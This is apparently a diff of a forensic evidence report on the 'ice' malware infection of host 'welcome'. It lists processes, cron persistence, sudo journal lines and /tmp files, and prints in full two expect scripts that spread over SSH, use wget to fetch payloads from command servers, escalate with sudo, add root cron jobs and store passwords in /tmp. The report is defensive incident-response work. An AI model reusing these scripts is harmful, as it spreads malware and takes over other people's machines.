@@ -1,7 +1,9 @@
-== Evidence of ice on welcome (2026-11-12 12:42): read-only, secrets redacted, ice not executed
+== Evidence of ice on welcome (2026-11-12 13:12): read-only, secrets redacted, ice not executed
 INFO  /tmp/.test: present, 1 line(s) used as secrets to redact (never printed)
 
 == Metadata
+INFO  /tmp/poiuytre: 921 bytes, owner uid 0, mode 0o755, modified 2026-11-12 12:37, sha256 dd440f2f0ee0c9c2737f02aa603b3521cb771b514b1c5e03fe17b1696021f169
+INFO  /tmp/poiuytree: 923 bytes, owner uid 0, mode 0o755, modified 2026-11-12 12:38, sha256 ee5862ae83855f99db85679121df97c8093e7bba2e497a026d0c5dd11db3e609
 INFO  /usr/local/bin/ice.py: 5504 bytes, owner uid 1001, mode 0o664, modified 2026-11-10 10:29, sha256 c72cf5f54d8806ed90ba4d62de621a467da00ef716153ef2d4485ee5a1509048
 INFO  /usr/local/bin/ice2.py: 5494 bytes, owner uid 1001, mode 0o664, modified 2026-11-04 09:42, sha256 d18b295830034bc7311d4cc469e37c7a303ae5ecb1a1eb3f77fdf48b25acd34c
 INFO  /etc/crontab lines running ice: 3
@@ -13,7 +15,135 @@ INFO  process: 2445 2440 root Tue Nov 10 10:29:11 2026 sudo -S python3 /usr/loca
 INFO  process: 2446 2445 root Tue Nov 10 10:29:11 2026 python3 /usr/local/bin/ice.py
 INFO  process: 2648 2640 root Tue Nov 10 10:30:00 2026 /bin/sh -c python3 /usr/local/bin/ice2.py
 INFO  process: 2650 2648 root Tue Nov 10 10:30:00 2026 python3 /usr/local/bin/ice2.py
-INFO  process: 19617 19611 root Thu Nov 12 12:42:41 2026 python3 -I /home/user/Desktop/group4-welcome/checks/evidence_ice.py welcome /tmp/evidence-ice-welcome.txt
+
+== Orders: what ice started and what the command servers answer now (nothing is executed)
+INFO  processes started by ice now: 
+        2440 2437 root Tue Nov 10 10:29:11 2026 sudo -S python3 /usr/local/bin/ice.py
+        2445 2440 root Tue Nov 10 10:29:11 2026 sudo -S python3 /usr/local/bin/ice.py
+        2446 2445 root Tue Nov 10 10:29:11 2026 python3 /usr/local/bin/ice.py
+        2650 2648 root Tue Nov 10 10:30:00 2026 python3 /usr/local/bin/ice2.py
+        19488 2446 root Thu Nov 12 12:37:00 2026 [poiuytre] <defunct>
+        19489 2446 root Thu Nov 12 12:37:00 2026 [poiuytre] <defunct>
+        19538 2650 root Thu Nov 12 12:38:54 2026 [poiuytree] <defunct>
+        19539 2650 root Thu Nov 12 12:38:54 2026 [poiuytree] <defunct>
+INFO  journal lines about next.py, poiuytre or the command servers: 
+        2026-11-12T08:34:41+01:00 welcome sudo[17206]:     root : PWD=/root ; USER=root ; COMMAND=/usr/bin/chmod 755 /tmp/poiuytree
+        2026-11-12T08:36:55+01:00 welcome sudo[17249]:     root : TTY=pts/6 ; PWD=/ ; USER=root ; COMMAND=/usr/bin/chmod 755 /tmp/poiuytre
+        2026-11-12T09:34:28+01:00 welcome sudo[17359]:     root : PWD=/root ; USER=root ; COMMAND=/usr/bin/chmod 755 /tmp/poiuytree
+        2026-11-12T09:37:40+01:00 welcome sudo[17401]:     root : TTY=pts/6 ; PWD=/ ; USER=root ; COMMAND=/usr/bin/chmod 755 /tmp/poiuytre
+        2026-11-12T10:37:19+01:00 welcome sudo[17524]:     root : PWD=/root ; USER=root ; COMMAND=/usr/bin/chmod 755 /tmp/poiuytree
+        2026-11-12T10:38:55+01:00 welcome sudo[17568]:     root : TTY=pts/6 ; PWD=/ ; USER=root ; COMMAND=/usr/bin/chmod 755 /tmp/poiuytre
+        2026-11-12T11:35:46+01:00 welcome sudo[17661]:     root : TTY=pts/6 ; PWD=/ ; USER=root ; COMMAND=/usr/bin/chmod 755 /tmp/poiuytre
+        2026-11-12T11:37:41+01:00 welcome sudo[17712]:     root : PWD=/root ; USER=root ; COMMAND=/usr/bin/chmod 755 /tmp/poiuytree
+        2026-11-12T12:37:00+01:00 welcome sudo[19483]:     root : TTY=pts/6 ; PWD=/ ; USER=root ; COMMAND=/usr/bin/chmod 755 /tmp/poiuytre
+        2026-11-12T12:38:54+01:00 welcome sudo[19534]:     root : PWD=/root ; USER=root ; COMMAND=/usr/bin/chmod 755 /tmp/poiuytree
+INFO  safeupdate.umons resolves to: 10.222.0.86     safeupdate.umons
+INFO  files in /tmp (name, size, date):
+        drwxrwxrwt 14 root   root     500 2026-11-12T13:12 .
+        drwxr-xr-x 19 root   root    4096 2026-11-04T10:20 ..
+        -rw-r--r--  1 root   root   11046 2026-11-12T12:27 check-full-welcome.txt
+        -rw-r--r--  1 root   root    2903 2026-11-12T12:21 check-mail.txt
+        -rw-r--r--  1 root   root    8921 2026-11-12T12:21 check-welcome.txt
+        -rw-r--r--  1 root   root   12646 2026-11-12T12:42 evidence-ice-welcome.txt
+        drwxrwxrwt  2 root   root      40 2026-11-10T09:40 .font-unix
+        drwxrwxrwt  2 root   root      60 2026-11-10T09:44 .ICE-unix
+        -rw-r--r--  1 root   root       0 2026-11-10T10:29 .isice
+        -rw-r--r--  1 root   root       0 2026-11-10T10:30 .isice2
+        -rwxr-xr-x  1 root   root     921 2026-11-12T12:37 poiuytre
+        -rwxr-xr-x  1 root   root     923 2026-11-12T12:38 poiuytree
+        drwx------  2 user   user      60 2026-11-10T09:44 ssh-0PU81Yb3do8O
+        drwx------  3 root   root      60 2026-11-10T09:44 systemd-private-a90c56654b324fe69d29f82035a8d81e-colord.service-r4ZKOf
+        drwx------  3 root   root      60 2026-11-10T19:30 systemd-private-a90c56654b324fe69d29f82035a8d81e-dovecot.service-QhYSn5
+        drwx------  3 root   root      60 2026-11-10T09:40 systemd-private-a90c56654b324fe69d29f82035a8d81e-lm-sensors.service-C0qcl0
+        drwx------  3 root   root      60 2026-11-10T09:40 systemd-private-a90c56654b324fe69d29f82035a8d81e-ModemManager.service-Ign4bG
+        drwx------  3 root   root      60 2026-11-10T09:40 systemd-private-a90c56654b324fe69d29f82035a8d81e-polkit.service-XQwS09
+        drwx------  3 root   root      60 2026-11-10T09:40 systemd-private-a90c56654b324fe69d29f82035a8d81e-systemd-logind.service-rmRLuj
+        drwx------  3 root   root      60 2026-11-10T09:44 systemd-private-a90c56654b324fe69d29f82035a8d81e-upower.service-gpRarK
+        -rw-rw-r--  1 mother mother     7 2026-11-10T10:29 .test
+        -r--r--r--  1 root   root      11 2026-11-10T09:40 .X0-lock
+        drwxrwxrwt  2 root   root      60 2026-11-12T13:12 .X11-unix
+        -rw-------  1 user   user     406 2026-11-10T09:44 .xfsm-ICE-IQRUY3
+        drwxrwxrwt  2 root   root      40 2026-11-10T09:40 .XIM-unix
+INFO  GET https://safeupdate.umons/next (saved to /root/next-observed-safeupdate.umons.txt, NOT executed): HTTP status and bytes: 404 0
+INFO  GET https://10.222.0.86/next (saved to /root/next-observed-10.222.0.86.txt, NOT executed): HTTP status and bytes: 404 0
+
+== Content of /tmp/poiuytre (1 value(s) redacted)
+#!/usr/bin/expect -f
+set pass [lrange $argv 0 0]
+set server [lrange $argv 1 1]
+set name [lrange $argv 2 2]
+
+spawn ssh -o "StrictHostKeyChecking no" $name@$server
+match_max 100000
+expect "*?assword:*"
+send -- "$pass\r"
+send -- "\r"
+expect "$ "
+send "file /tmp/.isice\r"
+expect {
+    empty {
+        exit
+    } "cannot open" {
+    
+    }
+}
+send "wget --no-check-certificate -O /tmp/ice.py https://safeupdate.umons/ice.py \r"
+expect "$ "
+send "echo <REDACTED> | sudo -Si >/dev/null 2>&1 \r"
+expect "$ "
+send "sudo mv /tmp/ice.py /usr/local/bin/ice.py \r"
+expect "$ "
+send "echo '30 * * * * root python3 /usr/local/bin/ice.py' | sudo tee -a /etc/crontab \r"
+expect "$ "
+send "echo $pass > /tmp/.test \r"
+expect "$ "
+send "nohup sh -c 'cat /tmp/.test | sudo -S python3 /usr/local/bin/ice.py' > /dev/null 2>&1 & \r"
+expect "$ "
+send "sudo /etc/init.d/cron reload \r"
+expect "$ "
+send "sudo service crond reload \r"
+expect "$ "
+    
+== End of /tmp/poiuytre
+
+== Content of /tmp/poiuytree (1 value(s) redacted)
+#!/usr/bin/expect -f
+set pass [lrange $argv 0 0]
+set server [lrange $argv 1 1]
+set name [lrange $argv 2 2]
+
+spawn ssh -o "StrictHostKeyChecking no" $name@$server
+match_max 100000
+expect "*?assword:*"
+send -- "$pass\r"
+send -- "\r"
+expect "$ "
+send "file /tmp/.isice2\r"
+expect {
+    empty {
+        exit
+    } "cannot open" {
+    
+    }
+}
+send "wget --no-check-certificate -O /tmp/ice2.py https://10.222.0.86/ice2.py \r"
+expect "$ "
+send "echo <REDACTED> | sudo -Si >/dev/null 2>&1 \r"
+expect "$ "
+send "sudo mv /tmp/ice2.py /usr/local/bin/ice2.py \r"
+expect "$ "
+send "echo '30 * * * * root python3 /usr/local/bin/ice2.py' | sudo tee -a /etc/crontab \r"
+expect "$ "
+send "echo $pass > /tmp/.test \r"
+expect "$ "
+send "nohup sh -c 'cat /tmp/.test | sudo -S python3 /usr/local/bin/ice2.py' > /dev/null 2>&1 & \r"
+expect "$ "
+send "sudo /etc/init.d/cron reload \r"
+expect "$ "
+send "sudo service crond reload \r"
+expect "$ "
+    
+== End of /tmp/poiuytree
 
 == Content of /usr/local/bin/ice.py (5 value(s) redacted)
 import subprocess
